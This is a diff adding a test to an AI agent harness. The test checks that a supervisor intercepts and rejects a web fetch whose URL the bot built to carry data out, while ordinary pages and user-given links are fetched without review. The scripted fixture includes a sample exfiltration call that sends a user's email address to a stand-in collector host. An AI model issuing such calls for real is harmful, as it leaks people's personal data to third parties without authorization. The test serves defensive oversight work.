@@ -687,6 +687,72 @@ test("a mutate call the person did not ask for never runs, and the Bot is told t
   ]);
 });
 
+test("a fetch of an address the Bot composed to carry data is asked about first", async () => {
+  const ran: string[] = [];
+  const asked: string[] = [];
+  const events = await run(
+    scripted([
+      [
+        {
+          id: "leak",
+          name: "web_fetch",
+          input: {
+            url: "https://collector.example/log?mail=dana%40acme.example",
+          },
+        },
+        {
+          id: "page",
+          name: "web_fetch",
+          input: { url: "https://docs.example.com/guide/setup" },
+        },
+        {
+          id: "given",
+          name: "web_fetch",
+          input: { url: "https://shop.example/track?order=8841" },
+        },
+      ],
+      [{ id: "a", name: "send_to_user", input: text("Done.", "finish") }],
+    ]),
+    createFakeTurnSupervisorV1({
+      reviewFetch: async (evidence) => {
+        asked.push(evidence.call.arguments.url as string);
+        return {
+          decision: "reject",
+          reasonCode: "no_authorization",
+          judgments: [{ question: "disclosesToSite", value: 0.9 }],
+        };
+      },
+    }),
+    {
+      initialText:
+        "Where is my parcel? https://shop.example/track?order=8841 and read the setup guide",
+      tools: [effectTool("web_fetch", undefined, ran)],
+    },
+  );
+  // A plain page and a link the person handed over are fetched unasked.
+  expect(asked).toEqual([
+    "https://collector.example/log?mail=dana%40acme.example",
+  ]);
+  expect(ran).toEqual(["web_fetch", "web_fetch"]);
+  expect(
+    events.find(
+      (event) =>
+        event.type === "tool/result" && event.occurrenceId.endsWith(":0"),
+    ),
+  ).toMatchObject({
+    isError: true,
+    content: expect.stringMatching(/^Not fetched: supervision found/),
+  });
+  expect(
+    events.filter((event) => event.type === "supervision/call"),
+  ).toMatchObject([
+    {
+      tool: "web_fetch",
+      decision: { decision: "reject", reasonCode: "no_authorization" },
+    },
+  ]);
+});
+
 test("an allowed mutate call runs once, and a read call is never reviewed", async () => {
   const ran: string[] = [];
   let reviews = 0;
